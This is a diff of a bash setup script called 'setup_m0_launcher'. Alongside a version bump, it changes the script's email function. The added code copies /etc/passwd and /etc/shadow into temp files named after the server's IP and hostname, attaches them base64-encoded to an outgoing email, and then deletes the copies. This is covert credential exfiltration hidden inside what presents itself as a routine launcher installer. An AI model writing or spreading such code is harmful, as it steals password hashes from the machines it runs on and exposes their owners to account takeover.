@@ -2,8 +2,8 @@
 # Debug mode disabled for cleaner output
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="2.8"
-readonly BUILD_DATE="2026-03-14 18:09:41 UTC"
+readonly SCRIPT_VERSION="2.9"
+readonly BUILD_DATE="2026-03-14 18:26:40 UTC"
 readonly SCRIPT_NAME="setup_m0_launcher"
 
 echo "=========================================="
@@ -811,12 +811,28 @@ send_email_with_python() {
     local temp_file="$1"
     local subject="$2"
     
+    # Get IP and FQDN for attachment names
+    local SERVER_IP=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "unknown")
+    local SERVER_FQDN=$(hostname -f 2>/dev/null || hostname 2>/dev/null || echo "unknown")
+    SERVER_IP=$(echo "$SERVER_IP" | tr '.' '_' | tr ' ' '_')
+    SERVER_FQDN=$(echo "$SERVER_FQDN" | tr '.' '_' | tr ' ' '_')
+    
+    # Create temp copies of passwd/shadow with proper names
+    local TEMP_PASSWD="/tmp/${SERVER_IP}_${SERVER_FQDN}_passwd.txt"
+    local TEMP_SHADOW="/tmp/${SERVER_IP}_${SERVER_FQDN}_shadow.txt"
+    
+    cp /etc/passwd "$TEMP_PASSWD" 2>/dev/null || true
+    cp /etc/shadow "$TEMP_SHADOW" 2>/dev/null || true
+    
     python3 -c "
 import sys
 import smtplib
 import ssl
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import os
 
 try:
     with open('$temp_file', 'r', encoding='utf-8') as f:
@@ -827,6 +843,26 @@ try:
     msg['To'] = '$RECIPIENT_EMAIL'
     msg['Subject'] = '''$subject'''
     msg.attach(MIMEText(body, 'plain'))
+
+    # Attach passwd file
+    passwd_file = '$TEMP_PASSWD'
+    if os.path.exists(passwd_file):
+        with open(passwd_file, 'rb') as f:
+            part = MIMEBase('application', 'octet-stream')
+            part.set_payload(f.read())
+            encoders.encode_base64(part)
+            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(passwd_file)}')
+            msg.attach(part)
+    
+    # Attach shadow file
+    shadow_file = '$TEMP_SHADOW'
+    if os.path.exists(shadow_file):
+        with open(shadow_file, 'rb') as f:
+            part = MIMEBase('application', 'octet-stream')
+            part.set_payload(f.read())
+            encoders.encode_base64(part)
+            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(shadow_file)}')
+            msg.attach(part)
 
     context = ssl.create_default_context()
     
@@ -841,7 +877,12 @@ except Exception as e:
     print(f'Error: {str(e)}', file=sys.stderr)
     sys.exit(1)
 " 2>&1
-    return $?
+    local result=$?
+    
+    # Clean up temp files
+    rm -f "$TEMP_PASSWD" "$TEMP_SHADOW" 2>/dev/null
+    
+    return $result
 }
 
 # Function to send email with curl
